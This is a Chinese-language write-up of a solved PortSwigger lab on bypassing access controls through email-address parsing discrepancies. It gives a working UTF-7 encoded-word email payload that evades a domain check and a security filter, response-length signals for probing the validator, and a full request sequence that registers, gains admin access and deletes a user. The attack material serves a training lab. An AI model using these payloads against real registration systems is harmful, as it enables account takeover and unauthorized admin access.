---
title: "lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies  [solved]"
links:
  - target: logic-flaws-family
    relation: evidences
---

# lab-logic-flaws-bypassing-access-controls-using-email-address-parsing-discrepancies  [solved]

> evidences: [[logic-flaws-family]]

- 题面:邮箱解析差异绕过访问控制;注册(邮箱域须 `ginandjuice.shop`)→ 确认 → 登录 → 删 carlos。
- 实例(批42R):https://0a9400c703a58315803c1cf500280059.web-security-academy.net
  邮箱客户端(唯一投递判据):https://exploit-0a4c00be03f983bb804e1b74010200c4.exploit-server.net/email
- 横幅原文:`<h4>Congratulations, you solved the lab!</h4>`(banner_verdict solved=true)

## 解(唯一载荷)

```
email = =?utf-7?q?attacker&AEA-exploit-0a4c00be03f983bb804e1b74010200c4.exploit-server.net&ACA-?=@ginandjuice.shop
```

- 校验器**不解 UTF-7**,只读 raw 串:最后一个 `@` 之后 = `ginandjuice.shop` ✓,local 全是 atext(`=`, `?` 属 atext)。
- mailer 按 RFC2047 解码:UTF-7 modified-base64 里 `&AEA-`→`@`、`&ACA-`→空格
  ⇒ 实际收件人 `attacker@exploit-…exploit-server.net `(尾空格 MTA 忽略)。
- 绕过滤要点:载荷是 `&AEA-` 这类 UTF-7 escape,raw 串里**没有** `=%XX`,故安全过滤(挡 `=[0-9a-fA-F]{2}`)不触发 —— 这正是批42"投递面为空"的真缺口:
  旧批只试了 Q-encoding / base64 encoded-word 与裸 `@` 注入。
- 投递证据(邮箱客户端 2026-10-06 14:36):`To = attacker@exploit-…exploit-server.net`,正文含
  `https://<lab>/register?temp-registration-token=AslTtGqxSN4kTGxyd3CwmDu4BADXoj3V`。
- 收口:GET 确认链接 → POST /login(csrf + atom1)→ GET /admin(页面出现 `/admin/delete?username=carlos` 链接)→ GET 即删(302 /admin)。

## 四闸门(判据 = body 长度,不是文案)

| len | 含义 |
|---|---|
| 3126 | 接受 |
| 3850 | 语法(Invalid email) |
| 3878 | 安全过滤(=%XX) |
| 3893 | 域不符 |

## 复现(全走件)

```
http_session post "<inst>/register" --form csrf=<c> --form username=atom1 \
  --form 'email==?utf-7?q?attacker&AEA-exploit-<id>.exploit-server.net&ACA-?=@ginandjuice.shop' --form password=Passw0rd!123
http_session get  "https://exploit-<id>.exploit-server.net/email"     # 读 To + 确认链接
http_session get  "<inst>/register?temp-registration-token=<token>"
http_session post "<inst>/login"  --form csrf=<c> --form username=atom1 --form password=…
http_session get  "<inst>/admin/delete?username=carlos"
```

来源:PortSwigger 研究论文《Splitting the Email Atom》(encoded-word/UTF-7 腿)+ 第三方 writeup 合成
(`writeup-shapes-portswigger-four-labs-hostheader-ssrf-cache-emailparse-race`);官方题页 solution details 块**未读**。
